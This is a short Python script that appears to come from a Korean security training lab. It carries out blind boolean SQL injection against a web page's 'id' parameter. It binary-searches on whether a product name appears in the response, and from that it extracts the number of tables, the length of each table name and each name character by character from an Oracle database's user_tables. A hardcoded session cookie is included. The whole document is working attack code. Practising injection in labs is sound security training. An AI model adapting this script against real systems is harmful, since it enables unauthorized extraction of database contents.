
import requests

urlBase = "https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62 and {}"
jsession = { "JSESSIONID" : "6314F90D6BF48454D081B25DB2D3DCC4" }

def binarySearch(queryBase):
    min = 1
    max = 127
    queryBase = queryBase + " > {}"
    while min != max:
        avg = int( (min + max) / 2 )
        query = queryBase.format(avg)
        url = urlBase.format(query)
        res = requests.get( url, cookies = jsession )
        if "권한이 없습니다." in res.text:
            print( "JSessionID 만료" )
            exit()
        if "MacBook" in res.text:
            min = avg + 1
        else:
            max = avg
    return min

countQuery = "(select count(table_name) from user_tables)"
countResult = binarySearch(countQuery)
print("테이블 수 : " + str(countResult))

for i in range( 1, countResult + 1 ):
    lengthQuery = "(select length(table_name) from (select table_name, rownum as rnum from user_tables) where rnum = {})".format(i)
    lengthResult = binarySearch(lengthQuery)
    print("{}번째 테이블의 문자열 길이 : {}개".format(i,lengthResult))
    table_name = ""
    for j in range( 1, lengthResult + 1 ) :
        substrQuery = "(select ascii(substr(table_name, {}, 1)) from (select table_name, rownum as rnum from user_tables) where rnum = {})".format(j, i)
        asciiSubstr = binarySearch(substrQuery)
        table_name = table_name + chr(asciiSubstr)
        print("{}번째 테이블 명 : {}".format(i, table_name))
        
    
    